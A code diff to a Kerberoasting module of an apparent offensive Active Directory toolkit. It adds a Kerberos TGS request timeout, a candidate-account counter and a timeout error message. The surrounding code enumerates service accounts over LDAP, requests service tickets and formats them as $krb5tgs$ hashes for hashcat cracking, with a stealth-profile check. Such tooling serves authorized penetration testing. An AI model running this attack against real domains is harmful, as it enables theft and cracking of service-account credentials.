@@ -21,6 +21,17 @@ from ares.modules.ad.dependencies import (
 )
 
 
+KERBEROS_TGS_TIMEOUT_SECONDS = 30
+
+
+def format_kerberoast_tgs_timeout(candidate_count: int) -> str:
+    return (
+        f"LDAP/SPN enumeration succeeded and found {candidate_count} "
+        "Kerberoastable candidate account(s), but the Kerberos TGS request "
+        "timed out before a hash was confirmed."
+    )
+
+
 def _format_krb5tgs_hash(tgs: bytes, cipher: "Any", spn: str, domain: str) -> str:
     """
     Convert raw impacket TGS response to $krb5tgs$ format for hashcat mode 13100/19700.
@@ -168,6 +179,7 @@ class KerberoastModule(BaseModule):
             return [], {"skipped": True, "reason": "stealth_profile_too_noisy"}
         await self.before_request(dc, "kerberos_tgs")
         logger.info("kerberoast_start", dc=dc, domain=domain, target=target_user)
+        self._last_candidate_count = 0
         self._last_spn_count = 0
         self._last_tgs_failures = 0
         try:
@@ -193,7 +205,7 @@ class KerberoastModule(BaseModule):
         }
         if not hashes:
             category, message = classify_kerberoast_outcome(
-                self._last_spn_count,
+                self._last_candidate_count,
                 len(hashes),
                 self._last_tgs_failures,
             )
@@ -260,6 +272,7 @@ class KerberoastModule(BaseModule):
         spn_list: list[str] = []
         if target_user:
             spn_list = [target_user]
+            self._last_candidate_count = 1
         else:
             # Get SPNs from enum_spn output if available, else query LDAP directly
             try:
@@ -270,7 +283,9 @@ class KerberoastModule(BaseModule):
                     noise=self.noise,
                 ).run(dc=dc, username=username, password=password, domain=domain)
                 _, spn_raw = spn_data
-                for acct in spn_raw.get("spn_list", spn_raw.get("spns", [])):
+                candidate_accounts = spn_raw.get("spn_list", spn_raw.get("spns", []))
+                self._last_candidate_count = len(candidate_accounts)
+                for acct in candidate_accounts:
                     spn_values = acct.get("spn_list") or acct.get("spns") or []
                     spn_list.extend(spn_values)
             except Exception as exc:
@@ -301,8 +316,9 @@ class KerberoastModule(BaseModule):
 
         for i, spn in enumerate(spn_list):
             try:
-                tgs, tgs_cipher, _, tgs_sk = await loop.run_in_executor(
-                    None, _get_tgs, spn
+                tgs, tgs_cipher, _, tgs_sk = await asyncio.wait_for(
+                    loop.run_in_executor(None, _get_tgs, spn),
+                    timeout=KERBEROS_TGS_TIMEOUT_SECONDS,
                 )
                 # Format as $krb5tgs$ hash for hashcat
                 hash_str = _format_krb5tgs_hash(tgs, tgs_cipher, spn, domain)
@@ -313,6 +329,12 @@ class KerberoastModule(BaseModule):
                         "spn":  spn,
                         "hash": hash_str[:60] + "...",
                     })
+            except asyncio.TimeoutError as exc:
+                raise ModuleValidationError(
+                    format_kerberoast_tgs_timeout(self._last_candidate_count),
+                    module_id=self.MODULE_ID,
+                    field="kerberos_tgs",
+                ) from exc
             except Exception as exc:
                 self._last_tgs_failures += 1
                 logger.debug("kerberoast_tgs_failed", spn=spn, error=str(exc)[:80])
